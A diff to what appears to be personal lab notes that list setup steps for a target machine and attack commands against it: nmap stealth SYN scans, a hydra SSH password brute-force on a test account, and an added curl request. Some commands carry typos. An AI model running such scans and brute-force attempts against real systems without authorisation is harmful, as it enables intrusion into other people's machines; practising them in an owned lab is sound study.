@@ -16,6 +16,7 @@
 - sudo passwd <usermame> (sets password for created user) 
 - sudo apt install -y openssh-server
 - sudo apt install -y apache2
+- sudo apt install curl
 
 #Attack Commands Used (from ATTACK MACHINE to TARGET MACHINE) 
 
@@ -25,6 +26,7 @@
 - nmap -sS -p 22,80 <target_IP> (stealth SYN scan on ports 22 and 80, SSH and HTTP respecitvely) 
 - nmap -sS -Pn -0 22,80 --min-rate 50 --max-retries 1 (target_IP> (skip host discovery, speeds up packet rate and keeps it short and controlled)
 - hyrda -l testuser -P ~/small_wordlist.txt -t 1 -f -V <target_IP> ssh (uses the password list small_wordlist.txt to attempt to gain access to user "testuser")
+- curl http://target_IP 
 
 
 
